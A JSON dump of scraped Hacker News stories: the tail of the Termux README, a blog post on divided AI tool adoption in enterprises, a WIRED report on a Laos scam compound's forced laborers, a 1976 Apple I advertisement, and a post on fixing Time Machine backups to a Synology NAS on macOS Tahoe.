list.\n\nIf you want to help out with testing the Google Play build (or cannot install Termux from other sources), be aware that it's built from a separate repository (https://github.com/termux-play-store/) - be sure to report issuesthere, as any issues encountered might very well be specific to that repository.\n\nUninstallation\n\nUninstallation may be required if a user doesn't want Termux installed in their device anymore or is switching to a differentinstall source. You may also want to considerBacking up Termuxbefore the uninstallation.\n\nTo uninstall Termux completely, you must uninstallany and all existing Termux or its plugin app APKslisted inTermux App and Plugins.\n\nGo toAndroid Settings->Applicationsand then look for those apps. You can also use the search feature if itâ€™s available on your device and searchtermuxin the applications list.\n\nEven if you think you have not installed any of the plugins, it's strongly suggested to go through the application list in Android settings and double-check.\n\nImportant Links\n\nCommunity\n\nAll community links are availablehere.\n\nThe main ones are the following.\n\nTermux Reddit community\n\nTermux User Matrix Channel(Gitter)\n\nTermux Dev Matrix Channel(Gitter)\n\nTermux X (Twitter)\n\nTermux Support Email\n\nWikis\n\nTermux Wiki\n\nTermux App Wiki\n\nTermux Packages Wiki\n\nMiscellaneous\n\nFAQ\n\nTermux File System Layout\n\nDifferences From Linux\n\nPackage Management\n\nRemote Access\n\nBacking up Termux\n\nTerminal Settings\n\nTouch Keyboard\n\nAndroid Storage and Sharing Data with Other Apps\n\nAndroid APIs\n\nMoved Termux Packages Hosting From Bintray to IPFS\n\nRunning Commands in Termux From Other Apps viaRUN_COMMANDintent\n\nTermux and Android 10\n\nTerminal\n\nTerminal resources\n\nXTerm control sequences\n\nvt100.net\n\nTerminal codes (ANSI and terminfo equivalents)\n\nTerminal emulators\n\nVTE (libvte): Terminal emulator widget for GTK+, mainly used in gnome-terminal.Source,Open Issues, andAll (including closed) issues.\n\nVTE (libvte): Terminal emulator widget for GTK+, mainly used in gnome-terminal.Sourc",
      "url": "https://github.com/termux/termux-app",
      "author_username": "tosh",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://camo.githubusercontent.com/9c14d4fbfda6abb126a406d570f172f45e72876e28ef385f719e8e823dd58014/68747470733a2f2f6261646765732e6769747465722e696d2f7465726d75782f7465726d75782e737667",
          "alt": "Join the chat at https://gitter.im/termux/termux"
        },
        {
          "type": "image",
          "url": "https://camo.githubusercontent.com/7c09fdc7ef9a56afa3dcb3b9bd0f3bd0176943ca6e0538aa936643768fea89dd/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f3634313235363931343638343038343233342e7376673f6c6162656c3d266c6f676f3d646973636f7264266c6f676f436f6c6f723d66666666666626636f6c6f723d353836354632",
          "alt": "Join the Termux discord server"
        },
        {
          "type": "image",
          "url": "https://camo.githubusercontent.com/eab085c0233c31fb310d41dbf78ea9af8932cf2875e0a02f9054e91a4ff11804/68747470733a2f2f6a69747061636b2e696f2f762f7465726d75782f7465726d75782d6170702e737667",
          "alt": "Termux library releases at Jitpack"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 349,
      "impressions_reposts": 0,
      "impressions_replies": 177,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:56.768382",
      "published_at": "2026-02-02T06:03:44",
      "scraped_at": "2026-02-03T09:02:56.768400",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46854642",
        "kids_count": 51,
        "sections": [
          "best_stories"
        ]
      },
      "content_hash": "e1fa49528229bf161f7032eedd236093"
    },
    {
      "id": "b9dd86d46b75c5d9f8dc60e758e2c456",
      "source": "hackernews",
      "source_id": "46850588",
      "title": "Two kinds of AI users are emerging",
      "content": "It still shocks me how much difference there is between AI users. I think it explains a lot about the often confusing (to me) coverage in the media about AI and its productivity impact.\n\nI think it's clear there are two types of users to me now, and by extension, the organisations they work for.\n\nFirst, you have the \"power users\", who are all in on adopting new AI technology - Claude Code, MCPs, skills, etc. Surprisingly, these people are oftennot very technical. I've seen far more non-technical people than I'd expect using Claude Code in terminal, using it for dozens of non-SWE tasks. Finance roles seem to be getting enormous value out of it (unsurprisingly, as Excel on the finance side is remarkably limiting when you start getting used to the power of a full programming ecosystem like Python).\n\nSecondly, you have the people who are generally only chatting to ChatGPT or similar.So manypeople I wouldn't expect are still in this camp.\n\nM365 Copilot has a lot to answer for\n\nOne extremely jarring realisation was just how poor Microsoft Copilot is. It hasenormousmarket share in enterprise as it is bundled in with various Office 365 subscriptions, yet feels like a poorly cloned version of the (already not great) ChatGPT interface. The \"agent\" feature is absolutely laughable compared to what a CLI coding agent (including Microsoft's own GitHub confusingly-named-Copilot CLI).\n\nTo really underline this, Microsoft itself is rolling out Claude Code to internal teams[1], despite (obviously) having access to Copilot at near zero cost, and significant ownership of OpenAI. I think this sums up quite how far behind they are\n\nThe problem is that in enterprise Copilot is often the only allowed AI tool, so that's all you can use without either potentially losing your job or spending a lot of effort trying to procure and use another AI tool. It's slow, the code execution tool in it doesn't work properly and fails horribly with large(ish) files, seemingly due to very very aggressive memory and CPU limitations.\n\nThis is becoming an existential risk for many enterprises. Senior decision makers are no doubt using these tools with such poor results and are therefore writing off AI, and/or spending a fortune with various large consulting and management consultancy outfits to get not very far.\n\nWhy enterprise is so at risk\n\nEnterprise corporate IT policy results in a completely disastrous combination of limitations that basically ensure that people cannot successfully use more 'cutting edge' AI tooling.\n\nFirstly, they tend to have extremely locked down environments, with no ability to run even a basic script interpreter locally (VBA if you are lucky, but even that may be limited by various Group Policies). Secondly, they're locked into legacy software with no real \"internal facing\" APIs on their core workflows, which means agents have nothing to connect to even if you could run them.\n\nFinally, they tend to have extremely siloed engineering departments (which may be completely outsourced), so there's nobody internally who could build the infrastructure to run safely sandboxed agents even if they wanted to.\n\nThe security concerns are real. You definitely do not want people YOLOing coding agents over production databases with no control, andas I've covered, sandboxing agents isdifficult[2].\n\nHowever, this does cause a real problem in so much that you don't have an engineering team that can help build the infrastructure to run safely sandboxed agents against your datasets.\n\nThe gap\n\nI've also spoken to many smaller companies that don't have all this baggage and areabsolutely flyingwith AI. The gap is so obvious when you can see both sides of it.\n\nOn one hand, you have Microsoft's (awful) Copilot integration for Excel (in fairness, the Gemini integration in Google Sheets is also bad). So you can imagine financial directors trying to use it and it making a complete mess of the most simple tasks and never touching it again.\n\nOn the other you have a non-technical executive who's got his head round Claude Code and can run e.g. Python locally. I helped one recently almost one-shot[3]converting a 30 sheet mind numbingly complicated Excel financial model to Python with Claude Code.\n\nOnce the model is in Python, you effectively have a data science team in your pocket with Claude Code. You can easily run Monte Carlo simulations, pull external data sources as inputs, build web dashboards and have Claude Code work with you to really integrate weaknesses in your model (or business). It's a pretty magical experience watching someone realise they have so much power at their fingertips, without having to grind away for hours/days in Excel.\n\nThis effectively leads to a situation where smaller company employees are able to beso muchmore productive than the equivalent at an enterprise. It often used to be that people at small companies really envied the resources & teams that their larger competitors had access to - but increasingly I think the pendulum is swinging the other way.\n\nThe future\n\nI'm starting to get a feel for what the future of work looks like. The first observation is that (often) the real leaps are being made organically by employees, not from a top down AI strategy. Where I see the real productivity gains are small teams deciding to try and build an AI assisted workflow for a process, and as they are the ones that know that process inside out they can get very good results - unlike an often outsourced software engineering team who have absolutely zero experience doing the process that they are helping automate. I think this is the opposite of what most 'digital transformation' projects looked like in enterprise.\n\nSecondly, companies that have some sort of APIs forinternalsystems are going to be able to do far more than those that don't. This might be as simple as a readonly data warehouse employees can connect to and run queries on behalf of users, or it could be as far as many complex core business processes being completely APId.\n\nThirdly, this all needs to be wrapped up in some sort of secure mechanism, but I actually think a hosted VM running some sort of code agent with well thought through network restrictions would work well, at least for read only reporting. For creating and editing data I don't think we quite have the model for non technical users (especially) to be able to use agents safely (yet).\n\nFinally, legacy enterprise SaaS players either have enormous lock in, or are extremely vulnerable depending on how you look at it. Most are not \"API-first\" products, and the APIs they have tend to be really for developer usage - not optimised for thousands of employees to ping in weird and wonderful inefficient ways. But if they are the source of truth for the company, they are going to be very difficult to migrate away fromandbottleneck a lot of productivity gains.\n\nAgain, smaller companies tend to use newer products which have far better thought through APIs (simply because they weren't often originally created many decades ago with various interfaces grafted on over time).\n\nThe user prompts, the agent synthesises - connecting to APIs and producing outputs on demand.\n\nWhat I've come to realise is that the power of having abash sandboxwith a programming language and API access to systems, combined with an agentic harness, results in outrageously good results for non technical users. It can effectively replace nearly every standard productivity app out there - both classic Microsoft Office style ones - and also web apps. It can build any report you ask for - and export it however you like. To me this seems like the future of knowledge work.\n\nThe bifurcation is real and seems to be, if anything, speeding up dramatically. I don't think there's ever been a time in history where a tiny team can outcompete a company one thousand times its size so easily.\n\nMicrosoft is using Claude Code internally while selling you Copilotâ†©ï¸\n\nMicrosoft is using Claude Code internally while selling you Copilotâ†©ï¸\n\nLet's keep in mind that users already have access to these systems. CISOs need to figure out how to enable these kind of secure VMs en masse. There's already precedent for this with Codespaces - it just requires a similar approach scaled up to the entire organisation.â†©ï¸\n\nLet's keep in mind that users already have access to these systems. CISOs need to figure out how to enable these kind of secure VMs en masse. There's already precedent for this with Codespaces - it just requires a similar approach scaled up to the entire organisation.â†©ï¸\n\nTwo or three prompts got it there, using plan mode to figure out the structure of the Excel sheet, then prompting to implement it. It even added unit tests to the Python model itself, which I was impressed with!â†©ï¸\n\nTwo or three prompts got it there, using plan mode to figure out the structure of the Excel sheet, then prompting to implement it. It even added unit tests to the Python model itself, which I was impressed with!â†©ï¸\n\nIf you found this useful, I write about AI tooling and software development monthly.Subscribe hereor drop your email:",
      "url": "https://martinalderson.com/posts/two-kinds-of-ai-users-are-emerging/",
      "author_username": "martinald",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 333,
      "impressions_reposts": 0,
      "impressions_replies": 324,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:57.143563",
      "published_at": "2026-02-01T18:45:18",
      "scraped_at": "2026-02-03T09:02:57.143587",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46850588",
        "kids_count": 52,
        "sections": [
          "best_stories"
        ]
      },
      "content_hash": "e8d7623c99f15322b33e834d2570c1d3"
    },
    {
      "id": "4730842ec7d3c90bde1ad7ebce321ea5",
      "source": "hackernews",
      "source_id": "46852660",
      "title": "Leaked chats expose the daily life of a scam compound's enslaved workforce",
      "content": "Just before 8amone day last April, an office manager who went by the name Amani sent out a motivational message to his colleagues and subordinates. â€œEvery day brings a new opportunityâ€”a chance to connect, to inspire, and to make a difference,â€ he wrote in his 500-word post to an office-wide WhatsApp group. â€œTalk to that next customer like you're bringing them something valuableâ€”because you are.â€\n\nAmani wasnâ€™t rallying a typical corporate sales team. He and his underlings worked inside a â€œpig butcheringâ€ compound, a criminal operation built to carry outscamsâ€”promising romance and riches fromcryptoinvestmentsâ€”thatoftendefraud victims out of hundreds of thousands or even millions of dollars at a time.\n\nRead the full story of WIRED's source, Mohammad Muzahir,here.\n\nThe workers Amani was addressing were eight hours into their 15-hour night shift in a high-rise building in the Golden Triangle special economic zone in Northern Laos. Like their marks, most of them were victims, too: forced laborers trapped in the compound, held in debt bondage with no passports. They struggled to meet scam revenue quotas to avoid fines that deepened their debt. Anyone who broke rules or attempted to escape faced far worse consequences: beatings, torture, even death.\n\nThe bizarre reality of daily life in a Southeast Asian scam compoundâ€”the tactics, the tone, the mix of cruelty and upbeat corporate prattleâ€”is revealed at an unprecedented level of resolution in a leak of documents to WIRED from a whistleblower inside one such sprawling fraud operation. The facility, known as the Boshang compound, is one of dozens of scam operations across Southeast Asia that have enslaved hundreds of thousands of people. Often lured from the poorest regions of Asia and Africa with fake job offers, these conscripts have become engines of the most lucrative form of cybercrime in the world, coerced into stealing tens of billions of dollars.\n\nLast June, one of those forced laborers, an Indian man named Mohammad Muzahir, contacted WIRED while he was still captive inside the scam compound that had trapped him. Over the following weeks, Muzahir, who initially identified himself only as â€œRed Bull,â€ shared with WIRED a trove of information about the scam operation. His leaks included internal documents, scam scripts, training guides, operational flowcharts, and photographs and videos from inside the compound.\n\nOf all Muzahirâ€™s leaks, the most revealing is a collection of screen recordings in which he scrolled through three monthsâ€™ worth of the compoundâ€™s internal WhatsApp group chats. Those videos, which WIRED converted into 4,200 pages of screenshots, capture hour-by-hour conversations between the compoundâ€™s workers and their bossesâ€”and the nightmare workplace culture of a pig butchering organization.\n\nâ€œItâ€™s a slave colony thatâ€™s trying to pretend itâ€™s a company,â€ says Erin West, a former Santa Clara County, California, prosecutor who leads an anti-scam organization called Operation Shamrock and who reviewed the chat logs obtained by WIRED. Another researcher who reviewed the leaked chat logs, Jacob Sims of Harvard Universityâ€™s Asia Center, also remarked on their â€œOrwellian veneer of legitimacy.â€\n\nâ€œItâ€™s terrifying, because itâ€™s manipulationandcoercion,â€ says Sims, who studies Southeast Asian scam compounds. â€œCombining those two things together motivates people the most. And itâ€™s one of the key reasons why these compounds are so profitable.â€\n\nIn another chat message, sent within hours of Amaniâ€™s saccharine pep talk, a higher-level boss weighed in: â€œDon't resist the company's rules and regulations,â€ he wrote. â€œOtherwise you can't survive here.â€ The staffers responded with 26 emoji reactions, all thumbs-ups and salutes.\n\nScam compound whistleblower Mohammad Muzahir, photographed in India after returning home from his ordeal as a forced laborer in the Golden Triangle.\n\nFined Into Slavery\n\nIn total, accordingto WIREDâ€™s analysis of the group chat, more than 30 of the compoundâ€™s workers successfully defrauded at least one victim in the 11 weeks of records available, totaling to around $2.2 million in stolen funds. Yet the bosses in the chat frequently voiced their disappointment in the groupâ€™s performance, berated the staff for lack of effort, and imposed fine after fine.\n\nRather than explicit imprisonment, the compound relied on a system of indentured servitude and debt to control its workers. As Muzahir described it, he was paid a base salary of 3,500 Chinese yuan a month (about $500), which in theory entailed 75 hours a week of night shifts including breaks to eat. Although his passport had been taken from him, he was told that if he could pay off his â€œcontractâ€ with a $5,400 payment, it would be returned to him and he would be allowed to leave.\n\nIn reality, the WhatsApp chats reveal how even that meager salary was almost entirely chipped away with fines. One message warns that anyone who fails to start a â€œfirst chatâ€â€”an introductory conversation with a scam victimâ€”on any given day will be fined 50 yuan, and the failure will be announced to the group. Filing a false progress report results in a fine of 1,000 yuan. Falling asleep in the office, or â€œwatching unrelated video, chatting with friends, and any activity that is not related to the jobâ€ are each punishable with a 200 yuan fine, as is any â€œdisturbanceâ€ in the dormitory, where workers sleep five or six to a room in bunk beds.\n\nOne message notes a fine of 500 yuan for a worker who slept late, and another fined 200 yuan for not being in the dorm at â€œcheck-in timeâ€ following his shift. Resist a fine by not signing a form that admits to the misbehavior, and the fine is doubled.\n\nAn org chart for part of the Boshang scam compound, assembled from leaked messages and Muzahirâ€™s knowledge of the operation.\n\nMuzahir himself described being fined so much that he was virtually broke. The food in the office cafeteria was also frequently denied as a punishment, the messages showed, with workersâ€™ ID badges that granted access to the canteen sometimes being taken away for seven days for small infractions like tardiness. Even the freedom to bring in snacks and drinksâ€”other than betel nuts, a stimulantâ€”could be rescinded if staff underperformed. Time off was also withheld, with staff sometimes forced to work seven nights a week, Muzahir says.\n\nYet those punishments could be avoided, the bosses frequently promised, if they successfully scammed someoneâ€”or â€œopened a customer,â€ as the bosses euphemistically described scamming a new victim. (Scamming the same victim multiple times was called a â€œrecharge.â€) In theory, workers were entitled to a commission, over and above their salary, for any scams they pulled off. Muzahir says he successfully perpetrated two scams during his months in the compoundâ€”both of which left him racked with regret, he saysâ€”and he was never paid after either of them.\n\nBosses nonetheless used workersâ€™ illusory hope of paying off their debtâ€”or even going home richâ€”as a motivator. â€œI understandâ€”when penalties or fines come your way, it's easy to feel disheartened. But I urge you not to see it as a punishment, but as a lesson and an investment in your own growth,â€ wrote Amani. â€œDon't fear the fine. Let it fuel your fire.â€\n\nThe more senior boss, who went by the name Da Hai, spelled out the carrot-and-stick approach more clearly. â€œThe company's incentives are much higher than the fines, so as long as you work hard to open new customers you will receive a generous reward!â€ he wrote.\n\nOne of the bossesâ€™ tactics was to play teams off one another, reprimanding underperforming workers while pointing to the success of other scammers in the compound. Each room of the office appears to have had a Chinese ceremonial drum, played when a worker successfully scammed a victim for a six-figure sum. â€œDo you know why the next office is beating drums?â€ wrote a higher-level boss called Alang.\n\nA victim had paid â€œ480k,â€ a boss who goes by the name Libo answers.\n\nâ€œIt doesn't matter, because he belongs to others,â€ Alang responds. â€œThe important thing is, which one of you can play the drum?â€\n\nUnder the Pretense, a Brutal Reality\n\nBeyond these manipulativetactics, the messages occasionally offer glimpses of a far harsher realityâ€”as does the personal experience and testimony of Muzahir himself. Muzahir describes hearing stories of people who were tortured and says he was himself threatened by Amani with beating and electrocution if he didnâ€™t find new â€œclients.â€ Sometimes coworkers disappeared without explanation.\n\nEventually Muzahir came up with a plan to trick his captors into letting him leave. When the bosses caught on, he was held in a room, beaten, slapped and kicked, denied food and water, and made to drink a solution with a white powder dissolved in it, which seems to have been intended to make him more cooperative with their interrogation.\n\nOccasional messages in the chat logs hint that these cruel punishments lurked underneath the compoundâ€™s motivational messages. At one point, the boss Alang mentions a girl who â€œsneaked away from the company and went to work in a brothel,â€ and another person in the group mentions that the â€œcompanyâ€ still holds her passport. Among the captive workers, Muzahir says, rumor had it that the girl was in fact sold into prostitution, a practice documented in other accounts from scam compound survivors.\n\nAt another point, while chastising the group for underperformance, the boss Da Hai hints at the large sum of money workers needed to produce if they ever hoped to leave the compound. â€œYou continue to violate the company's regulations,â€ he writes to the group. â€œIf you continue like this, please prepare your compensation and get out of here.â€\n\nSuch references to paying â€œcompensationâ€ for release are in fact â€œcoded words for ransom and debt bondage,â€ says Harvardâ€™s Sims. The nation of Laos, Sims points out, is a signatory to the Palermo Protocol, which classifies anyone held in debt and forced to work witho",
      "url": "https://www.wired.com/story/the-red-bull-leaks/",
      "author_username": "smurda",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://media.wired.com/photos/695d063065851e41961fe045/master/w_775%2Cc_limit/WIRED-FFRedBull-TheoTagholm-1-1080.jpg",
          "alt": "Image may contain: City, Road, Street, Urban, Plant, Vegetation, Person, Walking, Palm Tree, Tree, Path, Helmet, and Outdoors"
        },
        {
          "type": "image",
          "url": "https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_1600%2Cc_limit/_SMK7032%2520copy.jpg",
          "alt": "Image may contain Head Person Face Adult Crew Cut Hair Beard Photography and Portrait"
        },
        {
          "type": "image",
          "url": "https://media.wired.com/photos/6978d437c34fab0603ed21e7/master/w_1600%2Cc_limit/FFRedBull-OrgChart-V3.jpg",
          "alt": "Image may contain Text"
        },
        {
          "type": "image",
          "url": "https://media.wired.com/photos/69781980daea25e5eeb79a97/master/w_1600%2Cc_limit/WIRED-FFRedBull-SourceImage-3_WIRED-FFRedBull-SourceImage-3_ALTCREDIT.jpg",
          "alt": "Image may contain Plant Potted Plant and Lighting"
        },
        {
          "type": "image",
          "url": "https://media.wired.com/photos/69735b228b7aaa4c8f551ec2/master/w_1600%2Cc_limit/WIRED-RedBullFollowUp-Schedule.jpg",
          "alt": "An example of the schedules workers were required to post dailyâ€”not for themselves but for the wealthy female personas..."
        }
      ],
      "impressions_views": null,
      "impressions_likes": 273,
      "impressions_reposts": 0,
      "impressions_replies": 154,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:57.719813",
      "published_at": "2026-02-02T00:10:59",
      "scraped_at": "2026-02-03T09:02:57.719829",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46852660",
        "kids_count": 21,
        "sections": [
          "best_stories"
        ]
      },
      "content_hash": "ec2a382b8cb69adb066fd5bd52cd6505"
    },
    {
      "id": "efcc7ca749a56f699dbe96f9340524a7",
      "source": "hackernews",
      "source_id": "46847780",
      "title": "Apple I Advertisement (1976)",
      "content": "A Propos/What's news-:-Emulation-:-Applets-:-Java \n  /C /Assembler-:- Gallery -:-Docs-:-Links\n\nThis Page is Graphical intensive, Please \n  wait / Cette page est longue Ã  telecharger, Patientez, merci.\n\nAdvertising / PublicitÃ©\n\nApple Introduces the First Low Cost \n            Microcomputer System with a\n\nVideo Terminal and 8K Bytes of RAM \n            on a Single PC Card.\n\nThe \n                  Apple Computer. A truly complete microcomputer system on a single \n                  PC board. Based on the MOS Technology 6502 micro- processor, \n                  the Apple also has a built-in video terminal and sockets for \n                  8K bytes of onboard RAM memory. With the addition of a keyboard \n                  and video monitor, you'll have an extremely powerful computer \n                  system that can be used for anything from developing programs \n                  to playing games or running BASIC.Combining the computer, video terminal and \n                  dynamic memory on a single board has resulted in a large reduction \n                  in chip count, which means more reliability and lowered cost. \n                  Since the Apple comes fully assembled, tested & burned-in \n                  and has a complete power supply on-board, initial set-up is \n                  essentially \"hassle-free\" and you can be running within \n                  minutes. At $666.66 (including 4K bytes RAM!) it opens many \n                  new possibilities for users and systems manufacturers.You Don't Need an Expensive Teletype.Using the built-in video terminal \n                  and keyboard interface, you avoid all the expense, noise and \n                  mantenance associated with a teletype. And the Apple video terminal \n                  is six times faster than a teletype, which means more throughput \n                  and less waiting. The Apple connects directly to a video monitor \n                  (or home TV with an in- expensive RF modulator) and dis- plays \n                  960 easy to read characters in 24 rows of 40 characters per \n                  line with automatic scrolling. The video display section contains \n                  its own 1K bytes of memory, so all the RAM memory is available \n                  for user programs. And theKeyboard Interface lets you use almost \n                  any ASCII-encoded keyboard.The Apple Computer makes it possible for many \n                  people with limited budgets to step up to a video terminal as \n                  an I/O device for their computer.No More Switches,No MoreLightsCompared \n                  to switches and LED's, a video terminal can dis- play vast amounts \n                  of information simultaneously. The Apple video terminal can \n                  display the contents of 192 memory locations at once on the \n                  screen. And the fimrware in PROMS enables you to enter,display \n                  and debug programs (all in hex) from the keyboard, ren- dering \n                  a front panel unnecessary. The firmware also allows your programs \n                  to print characters on the display, and since you'll be looking \n                  at letters and numbers instead of just LED's, the door is open \n                  to all kinds of alphanumeric software (i.e., Games and BASIC).8K Bytes RAM in 16 Chips!The Apple Computer uses the new 16-pin 4K dynamic memory chips. \n                  They are faster and take 1/4 the space and power of even the \n                  low power 2102's (the memory chip that everyone else uses). \n                  That means 8K bytes in sixteen chips. It also means no more \n                  28 amp power supplies. Â Â Â The system is fully \n                  expandable to 65K via an edge connector which carries both the \n                  address and data busses, power supplies and all timing signals. \n                  All dy- namic memory refreshing for both on and off-board memory \n                  is done automatically. Also, the Apple Computer can be upgraded \n                  to use the 16K chips when they become availa-ble. That's 32K bytes on-board RAM in \n                  16 IC's --the equivalent of 256 2102's!A little Cassette Board that \n                  Works!Unlike many other cassette \n                  boards on the marketplace,ours works every timeIt plugs directly \n                  into the upright connector on the mainboard and stands only \n                  2\" tall.And since it is very fast (1500 bits per second), \n                  you can read or write 4 K bytes in about 20 seconds.All timing \n                  is done in software, witch results in crystal-controlled accuracy \n                  and uniformity from unit to unit.unlike some other cassette interfaces witch requires an expensive \n                  tape recorder, the Apple Cassette Interface works reliably with \n                  almost any audio-grade cassette recorder.SoftwaresA tape of APPLE BASIC \n                  is inclued free with the Cassette Interface.Apple Basic features \n                  immediate error message and fast execution, and let's you program \n                  in a highter level language immediately and without added cost.Also \n                  avialable now are a dis-assembler and many games, with many \n                  software packages,(including a macro assembler) in the works.And \n                  since our philosophy is to provide software for our machines \n                  free or at minimal cost, you won't be continually paying for \n                  access to this growing software library.The Apple Computer is in stock al almost all major computer \n                  stores.(if your local computer store doesn't carry our products, \n                  encourage them or write us direct).Dealer inquiries invited.Byte into an Apple \n                    ................. $666.66** Includes 4 Ko bytes \n                    RAMAPPLE Computer Compagny -770 \n                    Welch rd., Palo Atlt, CA 94304 - (415) 326-4248This Advertising is a courtesy of Fabrice Montupet's \n          Website :Forever \n          1970..80..90\n\nThe \n                  Apple Computer. A truly complete microcomputer system on a single \n                  PC board. Based on the MOS Technology 6502 micro- processor, \n                  the Apple also has a built-in video terminal and sockets for \n                  8K bytes of onboard RAM memory. With the addition of a keyboard \n                  and video monitor, you'll have an extremely powerful computer \n                  system that can be used for anything from developing programs \n                  to playing games or running BASIC.Combining the computer, video terminal and \n                  dynamic memory on a single board has resulted in a large reduction \n                  in chip count, which means more reliability and lowered cost. \n                  Since the Apple comes fully assembled, tested & burned-in \n                  and has a complete power supply on-board, initial set-up is \n                  essentially \"hassle-free\" and you can be running within \n                  minutes. At $666.66 (including 4K bytes RAM!) it opens many \n                  new possibilities for users and systems manufacturers.\n\nYou Don't Need an Expensive Teletype.Using the built-in video terminal \n                  and keyboard interface, you avoid all the expense, noise and \n                  mantenance associated with a teletype. And the Apple video terminal \n                  is six times faster than a teletype, which means more throughput \n                  and less waiting. The Apple connects directly to a video monitor \n                  (or home TV with an in- expensive RF modulator) and dis- plays \n                  960 easy to read characters in 24 rows of 40 characters per \n                  line with automatic scrolling. The video display section contains \n                  its own 1K bytes of memory, so all the RAM memory is available \n                  for user programs. And the\n\nKeyboard Interface lets you use almost \n                  any ASCII-encoded keyboard.The Apple Computer makes it possible for many \n                  people with limited budgets to step up to a video terminal as \n                  an I/O device for their computer.\n\nNo More Switches,No MoreLightsCompared \n                  to switches and LED's, a video terminal can dis- play vast amounts \n                  of information simultaneously. The Apple video terminal can \n                  display the contents of 192 memory locations at once on the \n                  screen. And the fimrware in PROMS enables you to enter,display \n                  and debug programs (all in hex) from the keyboard, ren- dering \n                  a front panel unnecessary. The firmware also allows your programs \n                  to print characters on the display, and since you'll be looking \n                  at letters and numbers instead of just LED's, the door is open \n                  to all kinds of alphanumeric software (i.e., Games and BASIC).\n\n8K Bytes RAM in 16 Chips!The Apple Computer uses the new 16-pin 4K dynamic memory chips. \n                  They are faster and take 1/4 the space and power of even the \n                  low power 2102's (the memory chip that everyone else uses). \n                  That means 8K bytes in sixteen chips. It also means no more \n                  28 amp power supplies. Â Â Â The system is fully \n                  expandable to 65K via an edge connector which carries both the \n                  address and data busses, power supplies and all timing signals. \n                  All dy- namic memory refreshing for both on and off-board memory \n                  is done automatically. Also, the Apple Computer can be upgraded \n                  to use the 16K chips when they become availa-\n\nble. That's 32K bytes on-board RAM in \n                  16 IC's ",
      "url": "http://apple1.chez.com/Apple1project/Gallery/Gallery.htm",
      "author_username": "janandonly",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 268,
      "impressions_reposts": 0,
      "impressions_replies": 157,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:58.103511",
      "published_at": "2026-02-01T12:36:57",
      "scraped_at": "2026-02-03T09:02:58.103526",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46847780",
        "kids_count": 33,
        "sections": [
          "best_stories"
        ]
      },
      "content_hash": "4a01a36834c1b6d8b716cb25847a106d"
    },
    {
      "id": "04d0cc64a853c5ab160049a252ae7a11",
      "source": "hackernews",
      "source_id": "46848699",
      "title": "TIL: Apple Broke Time Machine Again on Tahoe",
      "content": "Tao of Mac\n\nTIL: Apple Broke Time Machine Again On Tahoe\n\nSoâ€¦ Here we are again.\n\nToday, after a minor disaster with myObsidianvault, I decided to restore from Time Machine, andâ€¦ I realized that it had silently broken across both my Tahoe machines. I use aSynologyNAS as Time Machine target, exporting the share overSMBand that has worked flawlessly for years, but this came as a surprise because I could have sworn it was working fine a couple of months agoâ€“but no, it wasnâ€™t.\n\nFor clarity:It just stopped doing backups, silently. No error messages, no notifications, nothing. Just no backups for around two months. On my laptop, I only noticed because I was trying to restore a file and the latest backup was from December. On my desktop, I had a Thunderbolt external drive as a secondary backup.\n\nAfter some research, I found out that the issue is withAppleâ€™sunilateral decision to change their SMB defaults (without apparently notifying anyone), and came across a few possible fixes.\n\nWhat Seems To Be Working Now\n\nI foundthis gist, which I am reproducing here for posterity, that seems to be working for me, but which entails editing thensmb.conffile on the Mac itselfâ€“which is not exactly ideal, since Iâ€™m pretty sure Apple will break this again in the future.\n\nâ€¦and adding the following lines (the file should be empty):\n\nThe explanation here is thatmacOSTahoe changed the default fromsigning_required=noto stricter control, and NAS devices with relaxed SMB settings cannot handle this without explicit configuration.\n\nAnother common pitfall is name encoding issues in machine names, so you should remove Non-ASCII Characters from the.sparsebundlename (that wasnâ€™t an issue for me, but YMMV).\n\nOn theSynologyside, the recommendation was to go toControl Panel > File Services > SMB > Advancedand set:\n\nMaximum SMB protocol: SMB3\n\nEnable Opportunistic Locking: Yes\n\nEnable SMB2 Lease: Yes\n\nEnable SMB Durable Handles: Yes\n\nServer signing: No (or â€œAutoâ€)\n\nTransport encryption: Disabled\n\nThat doesnâ€™t quite match my DSM UI, but itâ€™s close enough, and my settings now look like this:\n\nMy SMB settings, as of DSM 7.3.2-86009-1\n\nMy Backup Backup Plan\n\nSince Iâ€™m tired of Apple breakingTime Machineevery few years and the lack of transparency around this (itâ€™s notSynologyâ€™s fault), I have decided to implement a more robust solution that doesnâ€™t depend on Synologyâ€™s SMB implementation.\n\nI already havea Proxmox server with ZFS as the backend storagethat has an LXC container running Samba for general file sharing, so I decided to look into that as a possible Time Machine target.\n\nAs it happens,mbentley/timemachineis aDockerimage specifically designed for this purpose, and it seems to be well-maintained, so Iâ€™m testing it like this:\n\nRight now the first optionseemsto be working, but I will probably switch to theDockersolution in the near future, since it gives me more control over theSMBimplementation and avoids relying onSynologyâ€™s software.\n\nBut if anyone from Apple is reading this: please, stop breakingTime Machineevery few years. Itâ€™s a critical piece of infrastructure for many users, and the lack of communication around these changes is frustrating.\n\nThe Third Way: Borg Backup\n\nI have been usingBorgfor some time now onFedora, and I am considering using it for my Macs as well.Vortaseems decent, I just havenâ€™t tried it yet.\n\nA Minor, Yet Annoying, Additional Problem\n\nPlus Iâ€™m annoyed enough that earlier this morning I tried to set up a newiOSdevice and the infamousRestore in Progress: An estimated 100 MB will be downloadedâ€¦bug (which has bitten me 